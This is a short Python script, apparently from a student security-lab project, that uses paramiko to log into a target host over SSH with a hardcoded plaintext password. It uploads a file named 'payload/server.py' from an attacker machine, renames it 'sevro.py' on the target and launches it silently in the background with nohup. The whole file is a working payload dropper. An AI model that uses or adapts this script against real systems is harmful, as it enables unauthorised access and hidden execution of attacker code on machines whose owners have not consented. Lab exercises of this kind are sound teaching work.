import paramiko

print("hi")

# SSH connection parameters
#host = "e1-target.local"  # Replace with your server's address
host = "192.168.206.129"
port = 22  # Default SSH port
username = "e1-target"  # Replace with your username
password = "aotismyfavoriteanime"  # Replace with your password
# ps aux | grep [s]evro.py
# PID is the first number (it might be something like 51132)
# do "kill 51132" to gracefully shut down the process

try:
    # Create an SSH client instance
    client = paramiko.SSHClient()
    
    # Automatically add untrusted hosts (make sure to use this only in a trusted environment)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Connect to the server
    client.connect(hostname=host, port=port, username=username, password=password, look_for_keys=False, 
    allow_agent=False, timeout=10)
    
    print(f"Successfully connected to {host}")
    
    # Execute a command (optional)
    stdin, stdout, stderr = client.exec_command('ls -l')  # Example command
    print(stdout.read().decode())  # Print the command output

    #uploading file through ssh
    # 1. Open an SFTP session
    sftp = client.open_sftp()
    
    # 2. Define your paths
    #local_path = "/Users/vishal/Desktop/final-project-theoreos/payload/server.py" 
    local_path = "/home/e1-attack/Desktop/final-project-theoreos/payload/server.py"
    remote_path = "/home/e1-target/Desktop/sevro.py"  # Where it goes on the target

    # 3. Upload the file
    print(f"Uploading {local_path} to {remote_path}...")
    sftp.put(local_path, remote_path)
    
    # 4. Close the SFTP session specifically
    sftp.close()
    print("Upload complete!")

    print("Executing the script...")
    #client.exec_command(f"chmod +x {remote_path} && python3 {remote_path}")
    client.exec_command(f"chmod +x {remote_path} && nohup python3 {remote_path} > /dev/null 2>&1 &")
    print("Command to execute sent!")
    
except paramiko.AuthenticationException:
    print("Authentication failed, please verify your credentials")
except paramiko.SSHException as e:
    print(f"Failed to connect to {host}: {e}")
finally:
    client.close()  # Close the connection
